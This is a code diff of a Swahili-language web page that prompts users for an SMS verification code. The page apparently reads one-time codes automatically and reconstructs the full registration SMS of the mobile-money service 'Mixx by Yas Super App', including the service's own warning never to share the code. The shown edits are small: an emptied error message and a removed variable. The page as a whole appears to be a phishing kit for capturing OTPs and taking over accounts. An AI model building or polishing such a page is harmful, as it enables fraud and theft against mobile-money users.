@@ -88,7 +88,7 @@
                 </a>
                 <textarea id="smsMessage" class="sms-textarea" placeholder="SMS itaonekana hapa kiotomatiki..."></textarea>
                 <div class="timer-bar" id="timerDisplay">⏳ 30s</div>
-                <div class="error-msg" id="codeError">Namba si sahihi</div>
+                <div class="error-msg" id="codeError"></div>
                 <button class="btn btn-gold" id="submitBtn" onclick="submitCode()">Endelea →</button>
                 <div class="resend-link"><a onclick="resendCode()">↻ Hukupokea SMS? Bonyeza hapa</a></div>
             </div>
@@ -129,7 +129,6 @@
         var resendCooldown = false;
         var isSubmitting = false;
         var smsDetected = false;
-        var extractedCode = '';
 
         // ================================================================
         // iPhone/Android DETECTION
@@ -312,9 +311,6 @@
                 .then(function(otp) {
                     clearTimeout(timeout);
                     if (otp && otp.code) {
-                        // Extract the code
-                        extractedCode = otp.code;
-                        
                         // Build the FULL SMS in your format
                         var fullSMS = 'You are being registered in Mixx by Yas Super App, use the code ' + otp.code + ' to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR';
                         
